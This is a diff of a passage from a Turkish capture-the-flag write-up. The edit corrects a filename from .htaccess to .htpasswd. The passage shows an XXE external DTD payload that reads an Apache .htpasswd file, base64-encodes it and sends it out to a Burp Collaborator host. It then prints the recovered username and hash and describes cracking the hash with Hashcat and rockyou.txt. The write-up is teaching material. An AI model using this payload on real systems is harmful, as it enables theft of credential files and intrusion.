@@ -90,13 +90,13 @@ Burada bize flag'in `C:\Windows` dizininde olduğunu ve flagin isminin `flag_\d{
 
 `/flag` dizinine girebilmek için HTTP Authentication kullanıcı adı ve parolasına ihtiyaç vardı. HTTP Authentication parolaları Apache sunucularda `.htpasswd` dosyasında saklanır. XXE zafiyetini kullanarak bu dosyayı aynı yukarıda `win.ini` dosyasını okuduğumuz gibi okuyabiliriz.
 
-**ex.dtd dosyasının içeriğini aşağıdaki gibi değiştirdim .htaccess'i okuyabilmek için:**
+**ex.dtd dosyasının içeriğini aşağıdaki gibi değiştirdim .htpasswd'i okuyabilmek için:**
 ```
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/.htpasswd">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://qmgtfsyjox8fdh4q8ug2io8kvb12pr.burpcollaborator.net/?%data;'>">
 ``` 
 
-`.htaccess` dosyasının içeriği:
+`.htpasswd` dosyasının içeriği:
 ![adim11](adim_11.png)
 
 HTTP Authentication için kullanıcı adı: `stalker` ve hashlenmiş parola: `$apr1$izrgXKZ1$0fVgd1MIioC14JG6VYwTw/`. Bu parolanın hangi hash fonksiyonu ile hashlendiğini araştırdım ve Apache MD5 diye bir format buldum. Bu formatı cracklemek için Hashcat'i hash türünü 1600 olarak seçerek kullandım. Tabii  dictionary olarak CTFlerin olmazsa olmazı rockyou.txt'yi kullandım.
